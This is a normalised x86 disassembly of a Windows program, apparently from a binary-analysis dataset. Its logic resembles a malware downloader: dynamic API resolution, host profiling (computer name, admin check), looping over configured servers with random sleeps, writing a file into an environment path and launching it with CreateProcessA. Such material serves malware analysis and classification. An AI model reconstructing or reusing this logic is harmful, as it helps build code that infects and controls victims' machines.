lea eax [ ebp - 0xb7 ]
push esi
push eax
mov [ ebp - 0xb8 ] 0x0
call sub_2007940
add esp 0xc
push 0x104
lea eax [ ebp - 0x2c7 ]
push esi
push eax
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x2c8 ] 0x0
call sub_2007940
add esp 0xc
push 0x103
lea eax [ ebp - 0x1bf ]
push esi
push eax
mov [ ebp - 0x1c0 ] 0x0
call sub_2007940
mov edi [ ebp + 0x8 ]
add esp 0xc
cmp edi esi
je r-xdata
or eax 0xffffffff
cmp ebx esi
je r-xdata
lea eax [ ebp - 0x2c8 ]
push r--data
push eax
call sub_2010397
lea eax [ ebp - 0x1c0 ]
push r--data
push eax
call sub_2010397
add esp 0x10
lea eax [ ebp - 0x1c0 ]
push eax
lea eax [ ebp - 0x2c8 ]
push eax
call [ GetModuleHandleA@IAT ]
push eax
call [ GetProcAddress@IAT ]
mov [ ebp - 0x8 ] eax
mov eax edi
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
jne r-xdata
mov eax ebx
lea edx [ eax + 0x1 ]
lea esi [ ebp + 0xb ]
call sub_2011439
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
jne r-xdata
call sub_2001330
test eax eax
je r-xdata
or [ ebp + 0xb ] 0x80
push 0x4
lea eax [ ebp - 0x78 ]
push ebx
push eax
call sub_2001910
add esp 0xc
call sub_2001e9f
cdq
mov ecx 0xffff
idiv ecx
lea eax [ ebp - 0x1c0 ]
push r--data
push eax
movzx esi dx
call sub_2010397
movzx eax si
push eax
lea eax [ ebp - 0x1c0 ]
push eax
lea eax [ ebp - 0x78 ]
push eax
call sub_2001633
add esp 0x14
jmp r-xdata
movzx eax [ ebp + 0xb ]
shl eax 0x18
mov [ ebp + 0x8 ] eax
lea eax [ ebp + 0x8 ]
push eax
call sub_2011200
lea eax [ ebp - 0x1c0 ]
mov [ esp ] r--data
push eax
call sub_2010397
pop ecx
pop ecx
call [ ebp - 0x8 ]
movzx eax ax
push eax
lea eax [ ebp - 0x1c0 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
call sub_2001633
add esp 0xc
lea eax [ ebp - 0x38 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call sub_20115c0
pop ecx
pop ecx
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0xb8 ]
push eax
mov [ ebp - 0x4 ] 0x40
call [ GetComputerNameA@IAT ]
lea eax [ ebp - 0xb8 ]
lea esi [ eax + 0x1 ]
call [ IsUserAnAdmin@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
leave
retn
mov al [ ebp - 0x78 ]
mov [ ebx ] al
mov al [ ebp - 0x77 ]
mov [ ebx + 0x1 ] al
mov al [ ebp - 0x76 ]
mov [ ebx + 0x2 ] al
mov [ ebx + 0x4 ] al
mov al [ ebp - 0x75 ]
mov [ ebx + 0x3 ] al
mov [ ebx + 0x5 ] al
mov eax [ ebx ]
push 0xa
mov esi edi
pop ecx
lea edi [ ebp - 0x78 ]
[ edi ] [ esi ]
mov [ ebp - 0x50 ] eax
lea eax [ ebp - 0x78 ]
push eax
call sub_20111da
mov esi eax
lea eax [ ebp - 0x1c0 ]
mov [ esp ] r--data
push eax
call sub_2010397
push esi
lea eax [ ebp - 0x1c0 ]
push eax
lea eax [ ebp - 0x78 ]
push eax
call sub_2001633
mov al [ ebp - 0x71 ]
mov [ ebx + 0xb ] al
mov al [ ebp - 0x72 ]
mov [ ebx + 0xa ] al
mov al [ ebp - 0x73 ]
mov [ ebx + 0x9 ] al
mov al [ ebp - 0x74 ]
mov [ ebx + 0x8 ] al
mov al [ ebp - 0x75 ]
mov [ ebx + 0x7 ] al
mov al [ ebp - 0x76 ]
mov [ ebx + 0x6 ] al
mov al [ ebp - 0x78 ]
mov [ ebx + 0x2 ] al
mov al [ ebp - 0x77 ]
add esp 0x14
mov [ ebx + 0x3 ] al
xor eax eax
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax esi
mov esi eax
push 0x8
pop eax
cmp esi eax
mov [ ebp - 0x4 ] esi
jge r-xdata
or [ ebp + 0xb ] 0x40
lea eax [ ebp - 0x1c0 ]
push r--data
push eax
call sub_2010397
push [ ebp + 0x8 ]
lea eax [ ebp - 0x1c0 ]
push eax
lea eax [ ebp - 0x78 ]
push eax
call sub_2001633
mov al [ ebp - 0x1c ]
mov [ edi + 0x8 ] al
mov al [ ebp - 0x1b ]
mov [ edi + 0x4 ] al
mov al [ ebp - 0x1a ]
mov [ edi + 0x20 ] al
mov al [ ebp - 0x19 ]
mov [ edi + 0x1b ] al
mov al [ ebp - 0x18 ]
mov [ edi + 0xd ] al
mov al [ ebp - 0x17 ]
mov [ edi + 0x3 ] al
mov al [ ebp - 0x16 ]
mov [ edi + 0x15 ] al
mov al [ ebp - 0x15 ]
mov [ edi + 0x19 ] al
mov al [ ebp - 0x14 ]
mov [ edi + 0x23 ] al
mov al [ ebp - 0x13 ]
mov [ edi + 0x27 ] al
mov al [ ebp - 0x12 ]
mov [ edi + 0x13 ] al
mov al [ ebp - 0x11 ]
mov [ edi + 0xf ] al
mov al [ ebp - 0x78 ]
mov [ edi ] al
mov al [ ebp - 0x77 ]
mov [ edi + 0x24 ] al
mov al [ ebp - 0x76 ]
mov [ edi + 0x1d ] al
mov al [ ebp - 0x75 ]
mov [ edi + 0x1a ] al
mov al [ ebp - 0x74 ]
mov [ edi + 0x22 ] al
mov al [ ebp - 0x73 ]
mov [ edi + 0xc ] al
mov al [ ebp - 0x72 ]
mov [ edi + 0x10 ] al
mov al [ ebp - 0x71 ]
mov [ edi + 0x7 ] al
mov al [ ebp - 0xb8 ]
mov [ edi + 0x1f ] al
mov al [ ebp - 0xb7 ]
mov [ edi + 0x17 ] al
mov al [ ebp - 0xb6 ]
mov [ edi + 0x25 ] al
mov al [ ebp - 0xb5 ]
mov [ edi + 0x5 ] al
mov al [ ebp - 0xb4 ]
mov [ edi + 0xa ] al
mov al [ ebp - 0xb3 ]
mov [ edi + 0x14 ] al
mov al [ ebp - 0xb2 ]
mov [ edi + 0x12 ] al
mov al [ ebp - 0xb1 ]
mov [ edi + 0x1 ] al
mov al [ ebp - 0x38 ]
mov [ edi + 0x26 ] al
mov al [ ebp - 0x37 ]
mov [ edi + 0xe ] al
mov al [ ebp - 0x36 ]
mov [ edi + 0xb ] al
mov al [ ebp - 0x35 ]
mov [ edi + 0x11 ] al
mov al [ ebp - 0x34 ]
mov [ edi + 0x18 ] al
mov al [ ebp - 0x33 ]
mov [ edi + 0x1e ] al
mov al [ ebp - 0x32 ]
add esp 0x14
mov [ edi + 0x21 ] al
mov al [ ebp - 0x31 ]
mov [ edi + 0x2 ] al
mov al [ ebp - 0x28 ]
mov [ edi + 0x6 ] al
mov al [ ebp - 0x27 ]
mov [ edi + 0x16 ] al
mov al [ ebp - 0x26 ]
mov [ edi + 0x1c ] al
mov al [ ebp - 0x25 ]
mov [ edi + 0x9 ] al
sub eax esi
push eax
lea ecx [ ebp + esi - 0xb8 ]
push 0x5f
push ecx
mov [ ebp - 0x8 ] eax
call sub_2007940
add esp 0xc
add esi [ ebp - 0x8 ]
mov [ ebp - 0x4 ] esi
mov [ ebp + esi - 0xb8 ] 0x0
sub_201219e
push ebp
mov ebp esp
sub esp 0x120
push ebx
push esi
push edi
xor ebx ebx
push 0x103
lea eax [ ebp - 0x11f ]
push ebx
push eax
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x120 ] bl
call sub_2007940
add esp 0xc
lea eax [ ebp - 0x120 ]
push r--data
push eax
mov [ ebp - 0x8 ] ebx
call sub_2010397
pop ecx
pop ecx
jmp r-xdata
push [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
lea eax [ ebp - 0x120 ]
push eax
call sub_200e78a
mov esi eax
mov [ ebp - 0x10 ] esi
cmp esi ebx
je r-xdata
inc [ ebp - 0x8 ]
cmp [ ebp - 0x8 ] 0x3
jl r-xdata
mov ebx esi
call sub_200ec15
test eax eax
jne r-xdata
xor ebx ebx
cmp [ ebp - 0x8 ] 0x3
jne r-xdata
call sub_200e863
mov esi [ ebp - 0x10 ]
and [ ebp - 0x4 ] 0x0
lea edi [ ebp - 0xc ]
lea ebx [ ebp - 0x4 ]
mov [ ebp - 0xc ] 0x4
call sub_200e69b
xor ebx ebx
cmp [ ebp - 0x4 ] ebx
jg r-xdata
xor eax eax
jmp r-xdata
push [ ebp - 0x4 ]
call sub_200178d
mov edi eax
pop ecx
cmp edi ebx
jne r-xdata
mov [ ebp - 0x14 ] 0x1
mov [ ebp - 0x4 ] 0x400
pop edi
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0xc ]
push eax
push [ ebp - 0x4 ]
push edi
jmp r-xdata
mov esi [ ebp - 0x10 ]
call sub_200e863
jmp r-xdata
mov eax [ ebp - 0x10 ]
call sub_200ea84
test eax eax
jne r-xdata
cmp [ ebp - 0xc ] 0x0
jbe r-xdata
mov esi [ ebp - 0x10 ]
call sub_200e863
mov eax [ ebp + 0x10 ]
mov [ eax ] ebx
mov eax edi
add ebx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
cmp ebx eax
jl r-xdata
lea ecx [ ebp - 0xc ]
push ecx
sub eax ebx
push eax
lea eax [ ebx + edi ]
push eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
lea esi [ eax + 0x19000 ]
push esi
push edi
call sub_200227f
pop ecx
pop ecx
test eax eax
je r-xdata
mov edi eax
mov eax esi
mov [ ebp - 0x4 ] eax
sub_20122d4
push ebp
mov ebp esp
sub esp 0x110
push ebx
push esi
xor ebx ebx
push 0x103
lea eax [ ebp - 0x10f ]
push ebx
push eax
mov [ edi ] ebx
mov [ ebp - 0x110 ] bl
call sub_2007940
add esp 0xc
lea eax [ ebp - 0x110 ]
push r--data
push eax
call sub_2010397
pop ecx
pop ecx
lea eax [ ebp - 0x110 ]
push eax
call sub_200e96f
mov [ ebp - 0x4 ] eax
cmp eax ebx
jne r-xdata
push r--data
push [ ebp + 0x8 ]
call sub_2001a34
push r--data
push ebx
call sub_2001a34
add esp 0x10
cmp eax ebx
jne r-xdata
xor eax eax
push eax
call sub_20018fc
pop ecx
push 0x50
pop eax
jmp r-xdata
push edi
push [ ebp + 0xc ]
push esi
call sub_201219e
add esp 0xc
mov ebx eax
call sub_200e863
jmp r-xdata
mov esi [ ebp - 0x4 ]
call sub_200e863
mov eax ebx
jmp r-xdata
push eax
push [ ebp + 0x8 ]
push [ ebp - 0x4 ]
call sub_200e8c8
mov esi eax
cmp esi ebx
jne r-xdata
pop esi
pop ebx
leave
retn
sub_2012389
push ebp
mov ebp esp
mov eax 0x10dc
call sub_200d790
push ebx
push esi
push edi
xor ebx ebx
push 0x27
lea eax [ ebp - 0x4f ]
push ebx
push eax
mov [ ebp - 0x50 ] bl
call sub_2007940
add esp 0xc
push 0x7ff
lea eax [ ebp - 0x10d7 ]
push ebx
push eax
mov [ ebp - 0x10d8 ] bl
call sub_2007940
add esp 0xc
push 0x3ff
lea eax [ ebp - 0x8d7 ]
push ebx
push eax
mov [ ebp - 0x8d8 ] bl
call sub_2007940
add esp 0xc
mov esi 0x103
push esi
lea eax [ ebp - 0x157 ]
push ebx
push eax
mov [ ebp - 0x158 ] bl
call sub_2007940
add esp 0xc
push esi
lea eax [ ebp - 0x4d7 ]
push ebx
push eax
mov [ ebp - 0x4d8 ] bl
call sub_2007940
lea eax [ ebp + 0x70 ]
add esp 0xc
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] eax
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
je r-xdata
inc [ ebp - 0x14 ]
add [ ebp - 0x10 ] 0x20
cmp [ ebp - 0x14 ] 0x3
jl r-xdata
xor eax eax
mov eax [ ebp - 0x10 ]
add eax 0xffffffa0
push eax
lea eax [ ebp - 0x158 ]
push eax
call sub_2010397
pop ecx
lea eax [ ebp - 0x158 ]
pop ecx
lea edx [ eax + 0x1 ]
or eax 0xffffffff
mov cl [ ebp + eax - 0x158 ]
mov [ ebp + eax - 0x50 ] cl
inc eax
cmp cl bl
jne r-xdata
push [ ebp - 0x10 ]
lea eax [ ebp - 0x178 ]
push eax
call sub_2010397
lea eax [ ebp - 0x158 ]
push r--data
push eax
call sub_2010397
mov esi [ ebp + 0xc ]
push esi
push [ ebp + 0x8 ]
lea eax [ ebp - 0x178 ]
push eax
lea eax [ ebp - 0x158 ]
push eax
lea eax [ ebp - 0x10d8 ]
push eax
call sub_2001633
add esp 0x24
lea eax [ ebp - 0x10d8 ]
push eax
lea eax [ ebp - 0x50 ]
push eax
lea edi [ ebp - 0x8 ]
mov [ ebp - 0x8 ] ebx
call sub_20122d4
cmp [ ebp - 0x8 ] 0x4
pop ecx
pop ecx
mov [ ebp - 0x4 ] eax
jb r-xdata
cmp [ ebp - 0x4 ] ebx
je r-xdata
push 0x4
push eax
push esi
call sub_2001910
add esp 0xc
push [ ebp - 0x4 ]
mov [ esi + 0x4 ] bl
call sub_20016b0
pop ecx
call sub_201027b
test eax eax
je r-xdata
push [ ebp - 0x4 ]
call sub_20016b0
pop ecx
push ebx
push [ ebp + 0x8 ]
mov ebx esi
call sub_2011db2
lea eax [ ebp - 0x158 ]
push r--data
push eax
call sub_2010397
push ebx
push [ ebp + 0x8 ]
lea eax [ ebp - 0x178 ]
push eax
lea eax [ ebp - 0x158 ]
push eax
lea eax [ ebp - 0x10d8 ]
push eax
call sub_2001633
lea eax [ ebp - 0x8d8 ]
add esp 0x24
push eax
call sub_2010760
pop ecx
test eax eax
je r-xdata
and [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x10d8 ]
push eax
lea eax [ ebp - 0x50 ]
push eax
lea edi [ ebp - 0x8 ]
call sub_20122d4
cmp [ ebp - 0x8 ] 0x400
pop ecx
pop ecx
mov [ ebp - 0x4 ] eax
jbe r-xdata
lea eax [ ebp - 0x158 ]
push r--data
push eax
call sub_2010397
pop ecx
lea eax [ ebp - 0x158 ]
pop ecx
mov edx eax
xor ebx ebx
mov eax edi
push eax
lea eax [ ebp - 0x4 ]
push eax
call sub_2010924
pop ecx
pop ecx
test eax eax
jne r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
lea edi [ ebp - 0x10d8 ]
sub eax edx
dec edi
push [ ebp - 0x8 ]
lea edx [ ebp - 0x28 ]
push [ ebp - 0x4 ]
mov [ ebp - 0x24 ] 0xcc22ccfc
mov [ ebp - 0x28 ] 0xff4cc3ff
mov [ ebp - 0x20 ] 0x32afaa
mov [ ebp - 0x1c ] 0x4d447c0a
call sub_20101f5
pop ecx
pop ecx
mov [ ebp - 0x18 ] eax
test eax eax
jbe r-xdata
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
mov esi edx
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
lea eax [ ebp - 0x8d8 ]
[ edi ] [ esi ]
mov ecx eax
lea eax [ ebp - 0x158 ]
push rw-data
push eax
call sub_2010397
lea eax [ ebp - 0x158 ]
push eax
call sub_20109d0
add esp 0xc
mov esi eax
lea eax [ ebp - 0x158 ]
push rw-data
push eax
call sub_2010397
lea eax [ ebp - 0x158 ]
push eax
call sub_20109d0
xor ebx ebx
add esp 0xc
cmp esi ebx
jne r-xdata
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
lea edi [ ebp - 0x10d8 ]
sub eax ecx
mov esi ecx
dec edi
cmp eax ebx
je r-xdata
cmp eax ebx
jne r-xdata
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
push 0x103
lea eax [ ebp - 0x3cf ]
push ebx
push eax
mov [ ebp - 0x3d0 ] bl
call sub_2007940
add esp 0xc
lea eax [ ebp - 0x158 ]
push r--data
push eax
call sub_2010397
pop ecx
pop ecx
push 0x104
lea eax [ ebp - 0x2c8 ]
push eax
lea eax [ ebp - 0x158 ]
push eax
call [ ExpandEnvironmentStringsA@IAT ]
lea eax [ ebp - 0x2c8 ]
push r--data
push eax
call sub_2001bb9
mov esi eax
pop ecx
pop ecx
cmp esi ebx
jne r-xdata
mov esi 0x104
push esi
lea eax [ ebp - 0x2c7 ]
push ebx
push eax
mov [ ebp - 0x2c8 ] bl
call sub_2007940
add esp 0xc
lea eax [ ebp - 0x158 ]
push r--data
push eax
call sub_2010397
pop ecx
pop ecx
lea edi [ esi + 0x1 ]
push edi
lea eax [ ebp - 0x2c8 ]
push eax
lea eax [ ebp - 0x158 ]
push eax
call [ ExpandEnvironmentStringsA@IAT ]
test eax eax
jbe r-xdata
lea eax [ ebp - 0x4d8 ]
push r--data
push eax
call sub_2010397
pop ecx
pop ecx
push 0x104
lea eax [ ebp - 0x158 ]
push eax
lea eax [ ebp - 0x4d8 ]
push eax
call [ ExpandEnvironmentStringsA@IAT ]
jmp r-xdata
push esi
push [ ebp - 0x8 ]
push 0x1
push [ ebp - 0x4 ]
call sub_200208b
push esi
call sub_2002585
add esp 0x14
xor eax eax
push [ ebp - 0x4 ]
call sub_20016b0
pop ecx
jmp r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x158 ]
push eax
call sub_2010b3d
pop ecx
lea eax [ ebp - 0x158 ]
push 0x5c
push eax
call sub_2002110
pop ecx
pop ecx
cmp eax ebx
je r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x18 ]
lea edi [ ecx + eax ]
mov ecx 0x1ac
lea esi [ ebp + 0xd8 ]
[ edi ] [ esi ]
jmp r-xdata
mov cl [ ebp + eax - 0x2c8 ]
mov [ ebp + eax - 0x3d0 ] cl
inc eax
cmp cl bl
jne r-xdata
lea edi [ ebp - 0x2c8 ]
dec edi
pop edi
pop esi
pop ebx
leave
retn
inc eax
push eax
lea eax [ ebp - 0x2c8 ]
push edi
push eax
call sub_200249a
add esp 0xc
lea eax [ ebp - 0x2c8 ]
call sub_20013c0
test eax eax
jne r-xdata
push ebx
push [ ebp - 0x4 ]
lea eax [ ebp - 0x158 ]
push eax
call sub_2010c94
add esp 0xc
test eax eax
jne r-xdata
mov al [ edi + 0x1 ]
inc edi
cmp al bl
jne r-xdata
lea eax [ ebp - 0x2c8 ]
push r--data
mov esi r--data
push eax
movsw [ edi ] [ esi ]
call sub_2001bb9
mov edi eax
pop ecx
pop ecx
cmp edi ebx
je r-xdata
lea eax [ ebp - 0x2c8 ]
push eax
lea eax [ ebp - 0x158 ]
push esi
push eax
call sub_2001ec1
add esp 0xc
push ebx
lea eax [ ebp - 0x2c8 ]
push eax
lea eax [ ebp - 0x158 ]
push eax
call [ CopyFileA@IAT ]
test eax eax
je r-xdata
push 0x64
call [ Sleep@IAT ]
jmp r-xdata
inc [ ebp - 0xc ]
cmp [ ebp - 0xc ] 0x1
jne r-xdata
push edi
xor esi esi
push 0x6b0
inc esi
lea eax [ ebp + 0xd8 ]
push esi
push eax
call sub_200208b
push edi
call sub_2002585
add esp 0x14
push 0x44
pop edi
push edi
lea eax [ ebp - 0x1c0 ]
push ebx
push eax
call sub_2007940
mov [ ebp - 0x1c0 ] edi
xor eax eax
lea edi [ ebp - 0x28 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
xor eax eax
lea edi [ ebp - 0x3d0 ]
add esp 0xc
mov [ ebp - 0x194 ] esi
mov [ ebp - 0x190 ] ax
dec edi
lea eax [ ebp - 0x4d8 ]
push r--data
push eax
call sub_2010397
pop ecx
pop ecx
push 0x104
lea eax [ ebp - 0x158 ]
push eax
lea eax [ ebp - 0x4d8 ]
push eax
call [ ExpandEnvironmentStringsA@IAT ]
cmp [ ebp - 0xc ] 0x3
jle r-xdata
lea eax [ ebp - 0x158 ]
push eax
call sub_2010b3d
pop ecx
jmp r-xdata
mov al [ edi + 0x1 ]
inc edi
cmp al bl
jne r-xdata
lea eax [ ebp - 0x158 ]
push r--data
mov esi r--data
push eax
movsw [ edi ] [ esi ]
call sub_2010397
pop ecx
lea eax [ ebp - 0x158 ]
pop ecx
mov edx eax
xor ebx ebx
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
lea edi [ ebp - 0x3d0 ]
sub eax edx
dec edi
mov cl [ edi + 0x1 ]
inc edi
cmp cl bl
jne r-xdata
mov ecx eax
shr ecx 0x2
mov esi edx
[ edi ] [ esi ]
mov ecx eax
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x1c0 ]
push eax
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
lea eax [ ebp - 0x3d0 ]
push eax
and ecx 0x3
push ebx
[ edi ] [ esi ]
call [ CreateProcessA@IAT ]
jmp r-xdata
sub_20129ba
push ebp
mov ebp esp
sub esp 0x264
and [ ebp - 0x4 ] 0x0
push ebx
xor eax eax
push esi
inc eax
push edi
mov [ ebp - 0x8 ] eax
mov [ rw-data ] eax
lea eax [ ebp - 0x158 ]
push r--data
push eax
call sub_2010397
mov ebx [ Sleep@IAT ]
pop ecx
pop ecx
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
je r-xdata
inc [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0x3
jne r-xdata
lea eax [ ebp - 0x260 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
lea edi [ ebp - 0xc ]
call sub_20122d4
pop ecx
pop ecx
test eax eax
jne r-xdata
mov esi [ ebp - 0x4 ]
shl esi 0x5
lea eax [ ebp + esi + 0x8 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_2010397
lea eax [ ebp + esi + 0x68 ]
push eax
lea eax [ ebp - 0x50 ]
push eax
call sub_2010397
push r--data
push r--data
lea eax [ ebp - 0x50 ]
push eax
lea eax [ ebp - 0x158 ]
push eax
lea eax [ ebp - 0x260 ]
push eax
call sub_2001633
lea eax [ ebp - 0x30 ]
add esp 0x24
lea edx [ eax + 0x1 ]
call sub_2001e9f
push 0xa
cdq
pop ecx
idiv ecx
imul edx edx 0x2710
push edx
call ebx
and [ ebp - 0x4 ] 0x0
jmp r-xdata
push eax
call sub_20016b0
pop ecx
pop edi
xor eax eax
pop esi
inc eax
pop ebx
leave
retn
call sub_2001e9f
push 0xa
cdq
pop ecx
idiv ecx
imul edx edx 0x3e8
push edx
call ebx
push 0x2
pop eax
cmp [ ebp - 0x8 ] eax
jne r-xdata
mov [ ebp - 0x8 ] eax
mov [ rw-data ] eax
xor eax eax
inc eax
mov [ ebp - 0x8 ] eax
mov [ rw-data ] eax
jmp r-xdata
CreateToolhelp32Snapshot
jmp [ CreateToolhelp32Snapshot@IAT ]
gethostbyname
jmp [ gethostbyname@IAT ]
inet_addr
jmp [ inet_addr@IAT ]
WSAStartup
jmp [ WSAStartup@IAT ]
sub_2001706
push 0x4
call sub_200568b
pop ecx
retn
sub_2001784
push 0x4
call sub_200568b
pop ecx
retn
sub_20018e6
mov edi edi
push ebp
mov ebp esp
push 0xa
push 0x0
push [ ebp + 0x8 ]
call sub_200696d
add esp 0xc
pop ebp
retn
sub_20018fc
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_20018e6
sub_2001baf
push [ ebp + 0x8 ]
call sub_2006ae2
pop ecx
retn
sub_2001e66
push [ ebp + 0x18 ]
call sub_2006ae2
pop ecx
retn
sub_2001e8d
mov edi edi
push ebp
mov ebp esp
call sub_2004244
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x14 ] ecx
pop ebp
retn
sub_2002103
push [ ebp + 0x14 ]
call sub_2006ae2
pop ecx
retn
sub_20023c3
push 0x4
call sub_200568b
pop ecx
retn
sub_20025f9
push esi
call sub_2006ae2
pop ecx
retn
sub_2002802
push [ ebp + 0x8 ]
call sub_2006ae2
pop ecx
retn
sub_2002911
push [ ebp + 0x8 ]
call sub_2006ae2
pop ecx
retn
sub_2002b3a
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x10 ]
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_2002abc
add esp 0x10
pop ebp
retn
sub_2002d34
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov ecx [ ecx ]
mov [ ebp - 0x24 ] ecx
push eax
push ecx
call sub_200a1d3
pop ecx
pop ecx
retn
sub_2002d6e
xor eax eax
inc eax
retn
_start
call sub_200a848
jmp sub_2002c09
sub_2002e3c
call sub_2006998
add eax 0x20
push eax
push 0x1
call sub_2006b1e
pop ecx
pop ecx
retn
sub_2002e4f
mov eax [ rw-data ]
or eax 0x1
xor ecx ecx
cmp [ rw-data ] eax
sete cl
mov eax ecx
retn
sub_2002ee9
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_2002ebe
pop ecx
push [ ebp + 0x8 ]
call [ ExitProcess@IAT ]
sub_2002f01
push 0x8
call sub_2005765
pop ecx
retn
sub_2002f0a
push 0x8
call sub_200568b
pop ecx
retn
sub_20030f0
cmp [ ebp + 0x10 ] 0x0
je r-xdata
retn
push 0x8
call sub_200568b
pop ecx
sub_2003105
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x0
push [ ebp + 0x8 ]
call sub_2002fd9
add esp 0xc
pop ebp
retn
sub_200311b
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x1
push [ ebp + 0x8 ]
call sub_2002fd9
add esp 0xc
pop ebp
retn
sub_2003131
push 0x1
push 0x0
push 0x0
call sub_2002fd9
add esp 0xc
retn
sub_2003140
push 0x1
push 0x1
push 0x0
call sub_2002fd9
add esp 0xc
retn
sub_20032ef
mov eax [ rw-data ]
push [ eax + esi * 4 ]
push esi
call sub_2006b1e
pop ecx
pop ecx
retn
sub_200331e
push 0x1
call sub_200568b
pop ecx
retn
sub_2003327
push 0x1
call sub_200324d
pop ecx
retn
sub_2003836
push 0xd
call sub_200568b
pop ecx
retn
sub_2003c01
push 0xd
call sub_200568b
pop ecx
retn
sub_2003c3a
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
retn
push 0xfffffffd
call sub_2003aa0
pop ecx
mov [ rw-data ] 0x1
sub_2003f71
push 0xc
call sub_200568b
pop ecx
mov esi [ ebp - 0x1c ]
retn
sub_2003fef
push 0x0
call sub_2003f7d
pop ecx
retn
sub_200406a
call [ TlsAlloc@IAT ]
retn 0x4
sub_20041b9
push 0xd
call sub_200568b
pop ecx
retn
sub_20041c2
push 0xc
call sub_200568b
pop ecx
retn
sub_2004244
mov edi edi
push esi
call sub_20041cb
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
retn
push 0x10
call sub_2002e95
pop ecx
sub_2004378
push 0xd
call sub_200568b
pop ecx
retn
sub_2004384
push 0xc
call sub_200568b
pop ecx
retn
sub_200462f
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_200568b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push [ eax * 8 + rw-data ]
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_200575c
push 0xa
call sub_200568b
pop ecx
retn
sub_20062a1
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx
retn
sub_2006630
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_2006a4f
call sub_2003327
cmp [ rw-data ] 0x0
je r-xdata
push [ rw-data ]
call sub_20016b0
pop ecx
retn
call sub_200c4a4
sub_2006f45
push 0x1
call sub_200568b
pop ecx
retn
sub_2007026
push ebp
mov ecx [ esp + 0x8 ]
mov ebp [ ecx ]
push [ ecx + 0x1c ]
push [ ecx + 0x18 ]
push [ ecx + 0x28 ]
call sub_2006f50
add esp 0xc
pop ebp
retn 0x4
sub_2007059
mov ebp edx
mov esi ecx
mov eax ecx
push 0x1
call sub_200cfe9
xor eax eax
xor ebx ebx
xor ecx ecx
xor edx edx
xor edi edi
jmp esi
sub_200708c
push ebp
mov ebp [ esp + 0x8 ]
push edx
push ecx
push [ esp + 0x14 ]
call sub_2006f50
add esp 0xc
pop ebp
retn 0x8
sub_2007883
push [ ebp + 0x8 ]
call sub_200d229
pop ecx
retn
sub_20081bf
push [ ebp + 0x8 ]
call sub_200d229
pop ecx
retn
sub_2008ba1
push [ ebp + 0x8 ]
call sub_200d229
pop ecx
retn
sub_2008e19
xor eax eax
inc eax
retn
sub_2008f77
push [ ebp + 0x8 ]
call sub_200d229
pop ecx
retn
sub_200a1c4
push sub_200a182
call [ SetUnhandledExceptionFilter@IAT ]
xor eax eax
retn
sub_200a1d2
retn
sub_200abd5
call sub_2002f0a
retn
sub_200abdb
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_200ab9f
neg eax
sbb eax eax
neg eax
pop ecx
dec eax
pop ebp
retn
sub_200ad3b
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov eax [ ecx ]
xor edx edx
cmp eax 0xc0000005
sete dl
mov eax edx
retn
sub_200ad6d
push 0x8
push r--data
call sub_200625c
call sub_2004244
mov eax [ eax + 0x78 ]
test eax eax
je r-xdata
call sub_200dee8
and [ ebp - 0x4 ] 0x0
call eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
sub_200ad8d
xor eax eax
inc eax
retn
sub_200ada6
push sub_200ad6d
call sub_2003f7d
pop ecx
mov [ rw-data ] eax
